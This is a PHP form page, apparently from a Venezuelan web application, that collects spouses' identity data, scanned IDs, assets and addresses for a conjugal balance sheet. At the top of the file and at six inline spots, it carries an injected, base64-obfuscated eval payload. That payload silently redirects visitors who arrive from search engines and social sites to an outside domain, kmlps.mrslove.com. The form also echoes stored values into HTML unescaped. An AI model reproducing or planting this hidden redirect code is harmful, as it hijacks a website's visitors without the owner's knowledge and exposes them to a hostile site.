<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
session_start();

if (isset($_GET['req']))
    require_once 'lib/function_gen.php';

$doc_code = null;
$doc_tipo = null;

$nro_iden = $_SESSION['g_usuario']['nro_identificacion'];
if (isset($_SESSION['Doc_Codigo_F']))
    $doc_code = $_SESSION['Doc_Codigo'];
if (isset($_SESSION['Doc_Tipo_F']))
    $doc_tipo = $_SESSION['Doc_Tipo'];

if ($doc_tipo)
    $conyugal = $doc_tipo == 2 ? getBalanceConyugal($doc_code, $nro_iden, 1) : getBalanceConyugal(null, $nro_iden, 1);
else
    $conyugal = getBalanceConyugal(null, $nro_iden, 1);

unset($_SESSION['Doc_Codigo_F']);
unset($_SESSION['Doc_Tipo_F']);

$bal2 = true;
if (!isset($conyugal['Cony1_CI']))
    $bal2 = false;
?>

<form name="paso_filldata2" autocomplete="off" id="paso_filldata2" action="balance_action.php" method="post" onsubmit="return _veri2();">
    <div id="data_conyugal">
        <h5>Cónyuge 1</h5><br />
        <label for="nro_indent_bal2_cony1" class="textformulario">Cédula:</label>
        <select name="nacionalidad" id="type_ci2_cony1" class="seleccion1" <? if ($bal2) echo "disabled" ?>>
            <option value="V" <? if ($bal2 && substr($conyugal['Cony1_CI'], 0, 1) == 'V') echo "selected"; ?> >V</option>
            <option value="E" <? if ($bal2 && substr($conyugal['Cony1_CI'], 0, 1) == 'E') echo "selected"; ?> >E</option>
        </select>
        <input name="nro_indent_bal2_cony1" id="nro_indent_bal2_cony1" type="text" class="relleno1" 
               value="<? if ($bal2) echo substr($conyugal['Cony1_CI'], 1); ?>" <? if ($bal2) echo "disabled" ?> maxlength="9" />

        <input type="hidden" name="nro_ident_cony1_hidden" id="nro_ident_cony1_hidden" 
               value="<? if ($bal2) echo $conyugal['Cony1_CI']; ?>" />
        <br /><br />

        <label for="nombre_bal2_cony1" class="textformulario">Nombre:</label>
        <input id="nombre_bal2_cony1" name="nombre_bal2_cony1" type="text" class="relleno" 
               value="<? if ($bal2) echo $conyugal['Cony1_Nombre']; ?>" maxlength="50" <? if ($bal2) echo "disabled" ?>/>
        <br /><br />

        <label for="apellido_bal2_cony1" class="textformulario">Apellido:</label>
        <input id="apellido_bal2_cony1" name="apellido_bal2_cony1" type="text" class="relleno" 
               value="<? if ($bal2) echo $conyugal['Cony1_Apellido']; ?>" maxlength="50" <? if ($bal2) echo "disabled" ?>/>
        <br><br>

        <label for="telefono_bal2_cony1" class="textformulario">Teléfono:</label>
        <input name="telefono_bal2_cony1" id="telefono_bal2_cony1" type="text" size="40" class="relleno telefono_num" 
               value="<? if ($bal2) echo $conyugal['Cony1_Telefono']; ?>" <? if ($bal2) echo "disabled" ?>/><br><br>

        <label for="profesion_cony1" class="textformulario">Profesión:</label>
        <select id="profesion_cony1" name="profesion_cony1" class="activoscirculante" style="float:right" <? if ($bal2) echo "disabled" ?>>
            <option value="">[Seleccione]</option>
            <? if ($bal2) getProfesiones($conyugal['BMP_CodigoPro_Cony1']); else getProfesiones(null); ?>
        </select>
        <br><br>

        <label for="actividad_com_cony1" class="textformulario">Actividad Comercial:</label>
        <input name="actividad_com_cony1" id="actividad_com_cony1" type="text" size="40" class="relleno" 
               value="<? if ($bal2) echo $conyugal['Cony1_ActComerci']; ?>" maxlength="100" <? if ($bal2) echo "disabled" ?>/>
        <br /><br />

        <span id="escaneo_cony1">
            <? if (!$bal2) { ?>
                <label for="per_imgci_bal2" class="textformulario">Escaneo de cédula</label>
                <input type="hidden" name="per_imgci_bal2" id="per_imgci_bal2" value="" class="relleno"/>
                <span class="relleno2">
                    <iframe src="balance-upload.php" id="imgframe" scrolling="no" frameborder="0" allowtransparency="true" style="height: 60px" onLoad="readframes(this, 'per_imgci_bal2');"></iframe>
                </span>
                <?
            } else { ?>
				
				<label for="per_imgci_bal2" class="textformulario">Escaneo de cédula</label>
                <input type="hidden" name="per_imgci_bal2" id="per_imgci_bal2" value="<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); echo $conyugal['Cony1_ImgCI']; ?>" class="relleno"/>
                <span class="relleno2">
                    <iframe src="balance-upload.php?per_imgci=<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); echo $conyugal['Cony1_ImgCI']; ?>" id="imgframe" scrolling="no" frameborder="0" allowtransparency="true" style="height: 60px" onLoad="readframes(this, 'per_imgci_bal2');"></iframe>
                </span>
            <?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); } ?>
            <br /><br /><br/><br>
			<span class="relleno">
				<input type="button" id="modificar_user_cony1" value="Modificar Datos" class="botoninputbalance"  <? if (!$bal2) echo "style='display: none'" ?> />
				<input type="button" id="aceptar_user_cony1" value="Realizar Cambios" class="botoninputbalance" style="display:none;"/>
			</span>
            <br /><br /><br />
        </span>

        <div id="lineag"></div><br />

        <h5>Cónyuge 2</h5><br />
        <label for="nro_indent_bal2_cony2" class="textformulario">Cédula:</label>
        <select name="nacionalidad" id="type_ci2_cony2" class="seleccion1" <? if ($bal2) echo "disabled" ?>>
            <option value="V" <? if ($bal2 && substr($conyugal['Cony2_CI'], 0, 1) == 'V') echo "selected"; ?> >V</option>
            <option value="E" <? if ($bal2 && substr($conyugal['Cony2_CI'], 0, 1) == 'E') echo "selected"; ?> >E</option>
        </select>
        <input name="nro_indent_bal2_cony2" id="nro_indent_bal2_cony2" type="text" class="relleno1" 
               value="<? if ($bal2) echo substr($conyugal['Cony2_CI'], 1); ?>" <? if ($bal2) echo "disabled" ?> maxlength="9" />

        <input type="hidden" name="nro_ident_cony2_hidden" id="nro_ident_cony2_hidden" 
               value="<? if ($bal2) echo $conyugal['Cony2_CI']; ?>" />
        <br /><br />

        <label for="nombre_bal2_cony2" class="textformulario">Nombre:</label>
        <input id="nombre_bal2_cony2" name="nombre_bal2_cony2" type="text" class="relleno" 
               value="<? if ($bal2) echo $conyugal['Cony2_Nombre']; ?>" maxlength="50" <? if ($bal2) echo "disabled" ?>/>
        <br /><br />

        <label for="apellido_bal2_cony2" class="textformulario">Apellido:</label>
        <input id="apellido_bal2_cony2" name="apellido_bal2_cony2" type="text" class="relleno" 
               value="<? if ($bal2) echo $conyugal['Cony2_Apellido']; ?>" maxlength="50" <? if ($bal2) echo "disabled" ?>/>
        <br><br>

        <label for="telefono_bal2_cony2" class="textformulario">Teléfono:</label>
        <input name="telefono_bal2_cony2" id="telefono_bal2_cony2" type="text" size="40" class="relleno telefono_num" 
               value="<? if ($bal2) echo $conyugal['Cony2_Telefono']; ?>" <? if ($bal2) echo "disabled" ?>/><br><br>

        <label for="profesion_cony2" class="textformulario">Profesión:</label>
        <select id="profesion_cony2" name="profesion_cony2" class="activoscirculante" style="float:right" <? if ($bal2) echo "disabled" ?>>
            <option value="">[Seleccione]</option>
            <? if ($bal2) getProfesiones($conyugal['BMP_CodigoPro_Cony2']); else getProfesiones(null); ?>
        </select>
        <br><br>

        <label for="actividad_com_cony2" class="textformulario">Actividad Comercial:</label>
        <input name="actividad_com_cony2" id="actividad_com_cony2" type="text" size="40" class="relleno" 
               value="<? if ($bal2) echo $conyugal['Cony2_ActComerci']; ?>" maxlength="100" <? if ($bal2) echo "disabled" ?>/>
        <br /><br />

        <span id="escaneo_cony2">
            <? if (!$bal2) { ?>
                <label for="per_imgci_bal3" class="textformulario">Escaneo de cédula</label>
                <input type="hidden" name="per_imgci_bal3" id="per_imgci_bal3" value="" class="relleno"/>
                <span class="relleno2">
                    <iframe src="balance-upload.php" id="imgframe2" scrolling="no" frameborder="0" allowtransparency="true" style="height: 60px" onLoad="readframes(this, 'per_imgci_bal3');"></iframe>
                </span>
                <?
            } else { ?>
				
				<label for="per_imgci_bal3" class="textformulario">Escaneo de cédula</label>
                <input type="hidden" name="per_imgci_bal3" id="per_imgci_bal3" value="<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); echo $conyugal['Cony2_ImgCI']; ?>" class="relleno"/>
                <span class="relleno2">
                    <iframe src="balance-upload.php?per_imgci=<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); echo $conyugal['Cony2_ImgCI']; ?>" id="imgframe2" scrolling="no" frameborder="0" allowtransparency="true" style="height: 60px" onLoad="readframes(this, 'per_imgci_bal3');"></iframe>
                </span>
            <?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); } ?>
            <br /><br /><br><br>
			<span class="relleno">
				<input type="button" id="modificar_user_cony2" value="Modificar Datos" class="botoninputbalance"  <? if (!$bal2) echo "style='display: none'" ?> />
				<input type="button" id="aceptar_user_cony2" value="Realizar Cambios" class="botoninputbalance" style="display:none;"/>
			</span>
            <br /><br /><br />
            <label for='fecha_bal2' class='textformulario'>Fecha: </label>
            <input id='fecha_bal2' name='fecha_bal2' class="datepicker maskdate relleno" <? if ($bal2) echo "disabled" ?> value="<? if ($bal2) echo $conyugal['Doc_PgFechaIns']; ?>"/>
            <br/><br/>
        </span>
        <br /><br />
        <input type="button" id="conyugal_insert" value="Enviar y Continuar" class="botoninputbalance" <? if ($bal2) echo "style='display: none'"; ?> />
    </div>

    <div id="data_cuenta_bal2" <? if (!$bal2) echo "style='display:none'" ?> >
        <div id="lineag"></div>
        <h5>Datos Activos</h5><br />

        <span class="textformulario">• Tipo Cuenta:</span>
        <select name="activoscirculantes" id="select_titulo2" class="activoscirculante">
            <? getTitulo(); ?>
        </select>
        <br /><br />

        <span class="textformulario">• Cuenta Mayor:</span>
        <select name="activoscirculantes" id="select_mayor2" class="activoscirculante">
            <? getMayor(1); ?>
        </select>
        <br /><br />

        <span class="textformulario">• Cuenta Detalle:</span>
        <select name="activoscirculantes" id="select_detalle2" class="activoscirculante">
            <? getMayor(11); ?>
        </select>
        <br /><br />

        <span style="display:none" name="valor_otros2" id="valor_otros2">
            <label for="valor_otros_bal2" class="textformulario">• Otros:</label>
            <input id="valor_otros_bal2" name="valor_otros_bal2" type="text" size="40" class="relleno5" maxlength="160" />
        </span>
        <br /><br />

        <span>
            <label for="valor_act_bal2" class="textformulario">• Valor del Activo:</label>
            <input name="valor_act_bal2" id="valor_act_bal2" type="text" size="40" class="relleno5" maxlength="16" />
        </span>
        <br />

        <div class="boton_verde_b">
            <a id="insert_doc_det2" href="#">Adjuntar</a>
        </div>
        <br /><br /><br />

        <div id="tabla_balance_bal2" class="tabla_2">

            <? if ($bal2) require_once 'balance_tabla.php'; else { ?>
                <table width="500" border="0" cellspacing="0" cellpadding="0" style="margin: 0 auto;">
                    <tr>
                        <td colspan="3"><div id="pestanabalance">Tabla de Balance</div></td>
                    </tr>
                    <tr class="fila_blanca_balance">
                        <td width="260"><span class="valores" style="text-align: center">Tipo de Valor</span></td>
                        <td width="130"><span class="valores">Monto del Valor</span></td>
                        <td width="100"><span class="valores"></span></td>
                    </tr>
                    <tr class="fila_linea">
                        <td colspan="3"></td>
                    </tr>
                </table>
                <input type='hidden' id='_aqehgjhcony_vall2' value='0' />
            <? } ?>
        </div>
        <br /><br />

        <div id="lineag"></div>
        <h5>Datos de envío</h5><br />
        <span class="textformulario">Estado</span>
        <span id="estado">
            <select name="select_state2" id="select_state2" class="activoscirculante select_state">
                <? if (isset($conyugal['Cony_Est'])) getStates($conyugal['Cony_Est']); else getStates(null); ?>
            </select>
        </span><br /><br />
        <span class="textformulario">Municipio</span>
        <span id="municipio">
            <select name="select_mun2" id="select_mun2" class="activoscirculante select_mun">
                <? if (isset($conyugal['Cony_Mun'])) getMunicipios($conyugal['Cony_Mun'], $conyugal['Cony_Est']); else getMunicipios(null, 595); ?>
            </select>
        </span><br /><br />
        <span class="textformulario">Parroquia</span>
        <span id="parroquia">
            <select name="select_par2" id="select_par2" class="activoscirculante">
                <? if (isset($conyugal['Cony_Parr'])) getParroquias($conyugal['Cony_Parr'], $conyugal['Cony_Mun']); else getParroquias(null, 621); ?>
            </select>
        </span><br /><br />

        <label for="calle_bal2" class="textformulario">Cod.Postal / Calle / Avenida:</label>
        <input name="calle_bal2" id="calle_bal2" type="text" size="40" class="relleno5" 
               value="<? if ($bal2) echo $conyugal['Cony_Calle']; ?>" maxlength="140" /><br /><br />

        <label for="edif_bal2" class="textformulario">Urbanización / Edificio / Casa:</label>
        <input name="edif_bal2" id="edif_bal2" type="text" size="40" class="relleno5" 
               value="<? if ($bal2) echo $conyugal['Cony_Edif']; ?>" maxlength="140" /><br /><br />

        <input type="submit" value="Enviar y continuar" class="botoninputbalance" />
    </div>

    <div id="dudas">
        Tienes dudas? ingresa a la sección de <span class="links"><a href="#">Preguntas Frecuentes</a></span>
    </div>               
</form>